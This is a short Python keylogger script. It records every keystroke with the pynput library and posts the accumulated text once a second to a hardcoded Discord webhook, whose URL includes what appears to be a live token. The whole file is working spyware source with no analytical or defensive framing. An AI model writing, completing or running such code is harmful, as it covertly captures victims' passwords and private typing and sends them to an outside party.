import os
from pynput import keyboard
import requests
import threading

text = ""
webhook_url = "https://discord.com/api/webhooks/1457184849881206918/SNxZ7gzzl6x9CpxIBOX4yebCwAzz09tqe5zd50ZKU8BfLLj5pllUTVFk9B6A2ykkBFm2"
time_interval = 1

def send_data():
    global text
    data = {
        "content": text,
        "title": "Logger"
    }
    requests.post(webhook_url, json=data)
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    if key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key == keyboard.Key.esc:
        return False
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip(" ' ")

send_data()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()